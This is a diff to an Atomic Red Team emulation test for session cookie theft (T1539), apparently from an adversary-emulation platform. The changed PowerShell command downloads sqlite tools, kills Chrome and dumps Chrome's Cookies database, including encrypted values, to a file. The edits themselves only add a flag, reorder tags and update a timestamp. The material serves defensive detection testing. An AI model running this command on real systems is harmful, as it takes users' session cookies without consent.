@@ -16,11 +16,12 @@
         command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"; Expand-Archive
-          -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath
-          "PathToAtomicsFolder\..\ExternalPayloads\" -force; fi; stop-process -name
-          "chrome" -force -erroraction silentlycontinue; "select host_key, name, encrypted_value,
-          path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -UseBasicParsing;
+          Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+          -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force; fi;
+          stop-process -name "chrome" -force -erroraction silentlycontinue; "select
+          host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly
+          from [Cookies];" | cmd /c PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
           "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file
           -filepath "PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt"'
         cleanup: 'remove-item #{output_file}'
@@ -31,9 +32,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1539
-  - atomic-red-team
   - credential-access
+  - atomic-red-team
+  - t1539
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -60,7 +61,7 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -UseBasicParsing
 
         Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
         -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
@@ -68,4 +69,4 @@
         '
     technique_created: '2019-10-08T20:04:35.508Z'
     atomic_guid: 26a6b840-4943-4965-8df5-ef1f9a282440
-    import_timestamp: '2026-10-20T07:08:30.051542Z'
+    import_timestamp: '2026-10-21T07:01:51.998920Z'
